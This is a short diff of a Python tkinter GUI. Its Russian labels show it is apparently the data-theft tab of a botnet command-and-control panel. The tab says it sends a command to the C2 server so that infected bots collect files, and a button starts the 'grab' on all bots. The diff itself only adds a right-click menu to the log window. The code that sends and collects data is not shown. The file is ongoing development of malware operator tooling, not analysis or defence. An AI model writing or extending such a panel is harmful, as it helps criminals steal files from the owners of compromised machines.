@@ -1,6 +1,7 @@
 import tkinter as tk
 from tkinter import ttk, messagebox
 import threading, socket, json
+from gui.widgets import RightClickMenu
 
 class ExfilTab:
     def __init__(self, notebook, app):
@@ -13,12 +14,12 @@ class ExfilTab:
         main.pack(fill=tk.BOTH, expand=True)
 
         ttk.Label(main, text="Захват данных с ботов", font=("Arial", 12, "bold")).pack(anchor='w')
-
         ttk.Label(main, text="Команда будет отправлена на C2, боты выполнят сбор файлов.").pack()
         ttk.Button(main, text="Запустить граб (на всех ботах)", command=self.start_grab).pack(pady=10)
 
         self.log = tk.Text(main, height=8, bg='white')
         self.log.pack(fill=tk.BOTH, expand=True)
+        RightClickMenu(self.log)
 
     def start_grab(self):
         def send():
